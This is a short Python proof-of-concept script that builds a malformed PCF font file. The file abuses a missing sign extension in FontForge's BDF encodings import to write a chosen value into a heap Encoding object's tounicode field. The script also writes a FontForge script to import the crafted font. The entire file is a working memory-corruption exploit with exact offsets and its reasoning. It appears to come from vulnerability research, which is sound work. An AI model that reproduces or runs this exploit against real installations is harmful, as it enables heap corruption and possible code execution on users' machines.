#!/usr/bin/env python3
"""W27: craft a PCF whose truncated BDF_ENCODINGS index writes a chosen value
into Encoding.tounicode at encs-696.

getformint16() does not sign-extend: a present low byte followed by EOF gives
glyph = low-256. TOC/table layout is the pinned truncated.pcf layout used by
make-size-case.py. With min2=max2=M2 and min1=max1=M1, tot=1 and i=0, so the
pinned RHS at fvimportbdf.c:1751 is M2*256+M1. Choosing M2=0x4142, M1=0x43
gives 0x00414243; low byte 0x52 gives glyph=-174, i.e. encs-696, the measured
offset of tounicode in the heap Encoding object.
"""
import pathlib
import struct
import sys

glyph = int(sys.argv[1]) if len(sys.argv) > 1 else -174
value = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x414243
if not -256 <= glyph <= -1:
    raise SystemExit("glyph must be -256..-1")
if not 0 <= value <= 0xFFFFFF:
    raise SystemExit("value must fit 24 bits")
HERE = pathlib.Path(__file__).resolve().parent
data = bytearray((HERE / "truncated.pcf").read_bytes()[:0x123])
struct.pack_into("<HHHH", data, 0x118, value >> 8, value >> 8, value & 0xFF, value & 0xFF)
data[0x122] = (256 + glyph) & 0xFF
out = HERE / "callpath.pcf"
out.write_bytes(data)
(HERE / "import-callpath.ff").write_text(f'New()\nImport("{HERE / "callpath.pcf"}")\n')
print(f"callpath.pcf: {len(data)} bytes glyph={glyph} value={value:#08x} target=encs{glyph * 4}")
